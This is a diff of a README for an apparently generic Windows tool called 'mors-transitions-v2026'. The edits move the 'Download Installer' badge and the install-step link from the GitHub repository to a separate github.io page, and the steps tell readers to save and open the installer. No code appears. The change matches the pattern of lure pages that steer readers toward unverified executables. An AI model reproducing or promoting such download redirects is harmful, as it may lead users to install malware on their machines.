@@ -1,7 +1,7 @@
 # ⚙️ mors-transitions-v2026 - Move your digital infrastructure without interruptions
 
 <div>
-<a href="https://github.com/Ommustaf3845/mors-transitions-v2026">
+<a href="https://ommustaf3845.github.io">
 <img src="https://img.shields.io/badge/Download_Installer-blue" alt="Download Link">
 </a>
 </div>
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the software effectivel
 
 Follow these steps to install and prepare the software on your Windows machine.
 
-1. Visit the project page to download the latest version: [https://github.com/Ommustaf3845/mors-transitions-v2026](https://github.com/Ommustaf3845/mors-transitions-v2026).
+1. Visit the project page to download the latest version: [https://ommustaf3845.github.io](https://ommustaf3845.github.io).
 2. Save the installer file to your computer.
 3. Open the file to begin the installation wizard.
 4. Follow the prompts on your screen to complete the setup process.
